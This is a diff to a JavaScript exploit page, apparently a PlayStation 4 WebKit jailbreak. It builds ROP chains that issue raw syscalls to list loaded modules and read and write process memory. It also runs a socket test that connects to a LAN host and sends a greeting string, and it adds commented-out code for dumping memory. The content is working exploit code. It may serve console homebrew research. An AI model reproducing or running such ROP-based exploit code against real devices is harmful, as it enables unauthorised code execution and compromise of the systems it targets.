@@ -164,40 +164,50 @@
     debug_log("vtable = 0x" + vtable_ptr.toString(16))
     debug_log("webkit_base_addr = 0x" + webkit_base_addr.toString(16))
     debug_log("buffer addr = 0x" + rop_buf_addr.toString(16))
+    
+    // var newBase = webkit_base_addr.add(0xC00000);
+    // cbuf[0x14] = newBase.getLowBitsUnsigned()
+    // cbuf[0x15] = newBase.getHighBitsUnsigned()
+    // cbuf[0x1e] = 0x80000;
+    // debug_bin(rop_buf, "webkit."+newBase.toString(16)+".bin");
+    
     debug_log("Starting ROP...")
     
     debug_log('Printing module information...')
-    for (var i = 0; i < 0x100; i++) {
-        var buf = storage.alloc(0x1A8)
-        var ret = storage.alloc(0x4)
-        write32(buf, 0x1A8)
-        var r = new RopChain();
-        r.syscall(608, i, 0, buf)
-        r.add('pop rdi')
-        r.add(ret)
-        r.add('mov qword ptr [rdi], rax')
-        r.execute()
-        if (read32(ret) != 0)
-            continue;
-        var base = read64(buf.add(0x44 * 4))
-        debug_log('Module name: ' + read_str(buf.add(0x8)))
-        debug_log('Module Index: ' + i.toString(16))
-        debug_log('Module Base: ' + base.toString(16))
-        debug_log('===============')
-        storage.free(0x1A8 + 0x4)
+    try {
+        for (var i = 0; i < 0x100; i++) {
+            var buf = storage.alloc(0x1A8)
+            var ret = storage.alloc(0x4)
+            write32(buf, 0x1A8)
+            var r = new RopChain();
+            r.syscall(608, i, 0, buf)
+            r.add('pop rdi')
+            r.add(ret)
+            r.add('mov qword ptr [rdi], rax')
+            r.execute()
+            if (read32(ret) != 0)
+                continue;
+            var base = read64(buf.add(0x44 * 4))
+            debug_log('Module name: ' + read_str(buf.add(0x8)))
+            debug_log('Module Index: ' + i.toString(16))
+            debug_log('Module Base: ' + base.toString(16))
+            debug_log('===============')
+            storage.free(0x1A8 + 0x4)
+        }
+        debug_log('Testing sockets...')
+        var s = socket()
+        debug_log('socket() returned 0x' + s.toString(16))
+        var cn = connect_helper(s, '10.0.1.142', 8989)
+        debug_log('connect() returned 0x' + cn.toString(16))
+        var str_to_write = "Hello From a PS4!\n"
+        var addr = storage.alloc(str_to_write.length)
+        write_str(addr, str_to_write)
+        var bytes_written = write(s, addr, str_to_write.length)
+        debug_log('write() returned 0x' + bytes_written.toString(16))
+        storage.free(str_to_write.length)
+    } catch (ex) {
+      debug_log("!! ERROR: "+ex);
     }
-
-    debug_log('Testing sockets...')
-    var s = socket()
-    debug_log('socket() returned 0x' + s.toString(16))
-    var cn = connect_helper(s, '10.0.1.142', 9023)
-    debug_log('connect() returned 0x' + cn.toString(16))
-    var str_to_write = "Hello From a PS4!\n"
-    var addr = storage.alloc(str_to_write.length)
-    write_str(addr, str_to_write)
-    var bytes_written = write(s, addr, str_to_write.length)
-    debug_log('write() returned 0x' + bytes_written.toString(16))
-    storage.free(str_to_write.length)
-
+    
     debug_log("DONE!")
 </script>
